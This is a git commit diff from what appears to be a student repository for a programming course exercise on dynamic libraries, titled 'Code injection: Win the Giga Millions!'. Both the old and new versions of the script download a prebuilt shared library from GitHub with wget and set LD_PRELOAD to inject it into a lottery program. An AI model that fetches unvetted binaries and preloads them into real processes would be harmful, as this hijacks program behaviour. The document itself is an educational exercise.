5f73cf02a75ddf679f8ad65cf73d8b529fd31a03
CletsyMedia <Cletussam12@yahoo.com>
2023-10-16 23:37:59 +0100

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,13 +1,3 @@
 #!/bin/bash
-
-# Set the URL for the raw libhack.so file on GitHub
-GITHUB_URL="https://raw.githubusercontent.com/CletsyMedia/alx-low_level_programming/master/0x18-dynamic_libraries/data/libhack.so"
-
-# Download libhack.so
-wget -O libhack.so $GITHUB_URL
-
-# Export LD_PRELOAD with the absolute path to libhack.so
-export LD_PRELOAD="$(pwd)/libhack.so"
-
-# Run the Giga Millions program with the desired numbers
-./gm 9 8 10 24 75 9
+wget -P ../ https://raw.githubusercontent.com/CletsyMedia/alx-low_level_programming/master/0x18-dynamic_libraries/data/libhack.so
+export LD_PRELOAD=../libhack.so
